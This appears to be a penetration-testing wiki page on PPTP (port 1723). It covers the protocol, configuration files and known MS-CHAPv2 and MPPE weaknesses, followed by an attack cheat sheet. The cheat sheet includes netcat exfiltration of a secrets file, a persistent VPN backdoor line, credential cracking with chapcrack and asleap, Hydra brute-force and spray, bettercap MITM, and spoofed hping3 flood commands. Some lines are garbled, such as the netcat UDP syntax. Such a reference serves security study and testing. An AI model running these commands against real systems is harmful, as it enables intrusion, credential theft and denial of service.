# P1723 PPTP

## Index

* \[\[Ports, Protocols, and Services]]

## Point-to-Point Tunneling Protocol (PPTP)

* **Port Number:** 1723
* **Protocol:** TCP (Control) / GRE (Data Tunneling)
* **Service Name:** PPTP (Point-to-Point Tunneling Protocol)
* **Defined in:** RFC 2637

Point-to-Point Tunneling Protocol (PPTP) is a network protocol used to implement virtual private networks (VPNs). PPTP encapsulates PPP (Point-to-Point Protocol) frames into IP datagrams for transmission over an IP-based network, such as the Internet or private intranets. Developed by a consortium that included Microsoft, PPTP has been widely used due to its simplicity and integration with Windows operating systems. However, its security weaknesses have led to the adoption of more secure alternatives like L2TP/IPsec and OpenVPN.

### Overview of Features

* **VPN Implementation:** PPTP is primarily used to create secure connections between remote clients and a private network, allowing the client to appear as part of the network.
* **Encapsulation:** PPTP encapsulates PPP frames inside GRE (Generic Routing Encapsulation) packets, enabling the use of multiple protocols within the VPN.
* **Ease of Use:** Due to its early inclusion in Microsoft operating systems, PPTP became a widely used VPN protocol due to its ease of configuration and use.
* **Authentication:** Supports multiple authentication methods, including PAP, CHAP, and MS-CHAPv1/v2.
* **Encryption:** PPTP typically uses MPPE (Microsoft Point-to-Point Encryption) for encrypting data, though the strength of this encryption is relatively weak compared to modern standards.
* **Control and Data Separation:** PPTP uses TCP for the control channel (port 1723) and GRE for data transmission, allowing it to maintain separate channels for management and data.

### Typical Use Cases

* **Remote Access VPNs:** Commonly used in corporate environments to allow remote workers to securely connect to the corporate network from home or other off-site locations.
* **Site-to-Site VPNs:** Can be used to connect two LANs over the internet, enabling resources in different geographical locations to be shared as if they were on the same local network.
* **Legacy Support:** Still in use for legacy systems and devices that do not support more modern VPN protocols.

### How PPTP Protocol Works

1. **Connection Establishment (Control Channel):**
   * **Step 1:** The client initiates a TCP connection to the PPTP server on port 1723.
   * **Step 2:** The server responds, and a control channel is established over TCP, which is used to manage the VPN session.
2. **Authentication:**
   * **Step 3:** The client sends authentication credentials via the PPP (Point-to-Point Protocol), encapsulated within the TCP control connection.
   * **Step 4:** The server verifies the credentials using the selected authentication protocol (e.g., PAP, CHAP, MS-CHAPv1/v2).
   * **Step 5:** If authentication is successful, the server assigns an IP address to the client for use within the VPN.
3. **GRE Tunnel Establishment:**
   * **Step 6:** The PPTP server establishes a GRE (Generic Routing Encapsulation) tunnel with the client for data transmission.
   * **Step 7:** All network traffic between the client and server is encapsulated within GRE packets, which are then transmitted over the IP network.
4. **Data Transmission:**
   * **Step 8:** Data sent by the client is encapsulated in PPP frames, which are then encapsulated in GRE packets and sent to the server.
   * **Step 9:** The server decapsulates the GRE packets, extracts the PPP frames, and routes the data to the appropriate destination within the private network.
5. **Session Termination:**
   * **Step 10:** Either the client or server can initiate the termination of the VPN session by sending a disconnect request over the control channel.
   * **Step 11:** The control channel is closed, and the GRE tunnel is torn down, ending the VPN session.

#### Diagram (Hypothetical Example)

* **Client:** `<attack_ip>` initiates connection to `<target_ip>`:1723
* **Server:** `<target_ip>` authenticates the client and establishes a GRE tunnel.
* **Client:** `<attack_ip>` sends/receives data via the GRE tunnel, encrypted by MPPE.

## Additional Information

### Security Considerations

* **Weak Encryption:** PPTP uses MPPE for encryption, which has been shown to be vulnerable to various attacks, including brute-force and cryptanalysis, making it less secure than modern VPN protocols like L2TP/IPsec or OpenVPN.
* **Vulnerability to MS-CHAPv2 Attacks:** The MS-CHAPv2 authentication method, commonly used with PPTP, has known vulnerabilities that allow attackers to easily crack the encryption and access the VPN.
* **Deprecated Status:** Due to its security flaws, PPTP is considered deprecated and is not recommended for use in secure environments. Most modern systems have disabled PPTP by default or provide warnings against its use.

### Alternatives

* **L2TP/IPsec:** A more secure VPN protocol that combines L2TP with IPsec to provide encryption and authentication.
* **OpenVPN:** A flexible, open-source VPN protocol that supports robust encryption and can run over various ports to avoid detection or filtering.
* **IKEv2/IPsec:** Another secure alternative, providing better encryption and stability, particularly in mobile environments where network connections may frequently change.

### Advanced Usage

* **Custom Configurations:** While PPTP is largely discouraged, custom implementations may still be used in controlled environments where security is not a primary concern, such as isolated internal networks or legacy systems.

### Modes of Operation

* **Single Tunnel Mode:** Most commonly used, where a single PPTP tunnel is established between a client and server.
* **Multiple Tunnel Mode:** Less common, where multiple PPTP tunnels are used simultaneously for different services or connections.

### Configuration Files

1. **Linux Server (pptpd):**

* **File Location:** `/etc/pptpd.conf`
*   **Configuration Example:**

    ```bash
    option /etc/ppp/pptpd-options
    logwtmp
    localip 192.168.0.1
    remoteip 192.168.0.100-200
    ```
* **Key Settings:**
  * `localip`: Specifies the IP address of the PPTP server.
  * `remoteip`: Defines the range of IP addresses that will be assigned to clients.

2. **PPP Options (Linux):**

* **File Location:** `/etc/ppp/pptpd-options`
*   **Configuration Example:**

    ```bash
    name pptpd
    refuse-pap
    refuse-chap
    refuse-mschap
    require-mschap-v2
    require-mppe-128
    ms-dns 8.8.8.8
    ms-dns 8.8.4.4
    ```
* **Key Settings:**
  * `require-mschap-v2`: Enforces the use of MS-CHAPv2 for authentication.
  * `require-mppe-128`: Requires 128-bit MPPE encryption.

3. **Windows Server:**

* **File Location:** Managed via the Routing and Remote Access Service (RRAS) interface, rather than specific configuration files.
* **Configuration Example:** Configurations are typically done through the RRAS management console, where the server can be set up to allow PPTP connections, configure IP address assignment, and manage authentication methods.

### Potential Misconfigurations

1. **Weak Encryption Settings:**
   * **Risk:** Using weak encryption settings (e.g., MPPE-40 or no encryption) can make the VPN susceptible to interception and data theft.
   * **Exploitation:** Attackers can use tools like `chapcrack` to exploit weak encryption and gain access to the VPN traffic.
2. **MS-CHAPv2 Vulnerabilities:**
   * **Risk:** Using MS-CHAPv2 without additional protections can expose the VPN to brute-force attacks that crack the authentication mechanism.
   * **Exploitation:** Attackers can capture the handshake and use tools like `asleap` or `chapcrack` to crack the MS-CHAPv2 hash.
3. **Exposed PPTP Service on the Internet:**
   * **Risk:** Leaving the PPTP service exposed on the public internet without adequate protections (e.g., firewall rules, strong authentication) can make it a target for attackers.
   * **Exploitation:** Attackers can scan for open port 1723 and attempt to brute-force or exploit known vulnerabilities in PPTP to gain unauthorized access.

### Default Credentials

PPTP itself does not have default credentials, as it relies on the underlying PPP authentication protocols (e.g., PAP, CHAP, MS-CHAPv2). However, weak or default credentials for these protocols, particularly in legacy systems, can be a significant security risk.

* **Common Default Credentials:**
  * Username: `admin`
  * Password: `admin`, `password`, or other commonly weak defaults

## Interaction and Tools

### Tools

#### \[\[PPTPSetup]]

*   **Establishing a PPTP Connection (Linux):** Configures and establishes a PPTP VPN connection using the `pptpsetup` utility.

    ```bash
    sudo pptpsetup --create <vpn_name> --server <target_ip> --username <username> --password <password> --encrypt

    sudo pppd call <vpn_name>
    ```

#### \[\[PPPD]]

*   **Manual PPTP Connection via `pppd` (Linux):** Manually invokes the `pppd` daemon to establish a PPTP connection, using configuration files in `/etc/ppp/peers/`.

    ```bash
    pppd call pptp
    ```

### Exploitation Tools

#### \[\[Metasploit]]

#### \[\[Wireshark]]

*   **Wireshark Packet Capture:**

    ```bash
    wireshark -i <interface> -f "tcp port 1723"
    ```

#### \[\[Nmap]]

*   **Basic Nmap Scan:** Scan target on specified port to verify if service is on.

    ```bash
    nmap <target_ip> -p 1723
    ```

#### \[\[NetCat]]

*   **Netcat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 1723
    ```
*   **Netcat UDP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 1723> -u
    ```
*   **Execute Commands:** Execute commands on target.

    ```bash
    echo "<command>" | nc <target_ip> 1723
    ```
*   **Exfiltrate Data:** Exfiltrate data over specified port.

    ```bash
    nc <target_ip> 1723 < secret_data.txt
    ```

#### \[\[SoCat Cheat Sheet]]

*   **SoCat TCP Connect:** Simple tests to verify port service is running and responding.

    ```bash
    socat - TCP:<target_ip>:1723
    ```

#### \[\[HPing3 Cheat Sheet]]

*   **Send Packet:** Send TCP packet to the service. Use `-2` to send UDP packet.

    ```bash
    hping3 <target_ip> -p 1723
    ```

#### \[\[Chapcrack]]

*   **Crack MS-CHAPv2 Challenge-Response Pair:** Exploits the vulnerabilities in MS-CHAPv2 to recover plaintext passwords.

    ```bash
    chapcrack --crack --challenge=CHALLENGE --response=RESPONSE
    ```

#### \[\[Asleap]]

*   **Crack MS-CHAPv2 Challenge-Response Pair:** Brute-forces MS-CHAPv2 challenge-response pairs to recover VPN credentials.

    ```bash
    asleap -C CHALLENGE -R RESPONSE -W wordlist.txt
    ```

### Other Techniques

#### Connecting to PPTP VPN (Windows)

* **Windows:**
  1. Open "Network and Sharing Center".
  2. Click "Set up a new connection or network".
  3. Choose "Connect to a workplace" and select "Use my Internet connection (VPN)".
  4. Enter the server address (`<target_ip>`) and credentials (`<username>` and `<password>`).
  5. Click "Connect" to establish the VPN connection.

#### Custom GRE Tunnel Configuration

*   **Custom Script:** Manually configures a GRE tunnel to be used with PPTP, allowing for custom routing and firewall rules.

    ```bash
    ip tunnel add pptp0 mode gre remote <target_ip> local <attack_ip>
    ifconfig pptp0 up
    ```

## Penetration Testing Techniques

### External Reconnaissance

#### Port Scanning

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap <target_ip> -p 1723
    ```
* **Description:** Identifies if the target service is running on the target by scanning target port.

#### Service Enumeration

*   **Tool:** \[\[NetCat]]

    ```bash
    nc <target_ip> 1723
    ```
* **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

### Initial Access

#### Exploiting MS-CHAPv2

*   **Tool:** \[\[Chapcrack]]

    ```bash
    chapcrack --crack --challenge=CHALLENGE --response=RESPONSE
    ```

    \

*   **Tool:** \[\[Asleap]]]

    ```bash
    asleap -C CHALLENGE -R RESPONSE -W wordlist.txt
    ```
* **Description:** Exploits the vulnerabilities in MS-CHAPv2 to gain initial access by cracking the VPN credentials.

### Persistence

#### Persistent VPN Backdoor

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    echo "pptp <target_ip> user <username> password <password>" >> /etc/ppp/peers/vpn-backdoor
    ```
* **Description:** Establishes a persistent VPN connection that can be reactivated by the attacker when needed.

### Credential Harvesting

#### Packet Capture

*   **Tool:** \[\[Wireshark]]

    ```bash
    wireshark -i <interface> -f "tcp port 1723"
    ```
* **Description:** Capture traffic and extract plaintext credentials.

#### Man-in-the-Middle (MITM) Attack

*   **Tool:** \[\[BetterCap Cheat Sheet]]

    ```bash
    bettercap -iface <interface> -T <target_ip> --proxy
    ```
* **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

## Exploits and Attacks

### Password Attacks

#### Password Brute Force

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra <protocol>://<target_ip> -s <target_port> -l <username> -P <password_list>
    ```
* **Description:** Test a single username against multiple passwords.

#### Password Spray

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra <protocol>://<target_ip> -s <target_port> -l <username_list> -P <password>
    ```
* **Description:** Test a multiple usernames against a single password.

### Denial of Service

#### TCP/UPD Flood Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip> -p 1723 --flood --rand-source -c 1000
    ```
* **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

#### TCP/UDP Reflection Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip_1> -p 1723 --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
* **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

## Resources

| **Website**              | **URL**                                             |
| ------------------------ | --------------------------------------------------- |
| RFC 2637                 | https://tools.ietf.org/html/rfc2637                 |
| Nmap PPTP Script         | https://nmap.org/nsedoc/scripts/pptp-version.html   |
| Chapcrack Documentation  | https://github.com/moxie0/chapcrack                 |
| Asleap Manual            | https://www.willhackforsushi.com/?page\_id=41       |
| Metasploit Framework     | https://www.metasploit.com                          |
| Wireshark User Guide     | https://www.wireshark.org/docs/wsug\_html\_chunked/ |
| pptpd Project            | https://poptop.sourceforge.net                      |
| Linux pppd Documentation | https://ppp.samba.org/                              |
| OpenVPN Alternatives     | https://openvpn.net/                                |
| IKEv2/IPsec Overview     | https://tools.ietf.org/html/rfc7296                 |
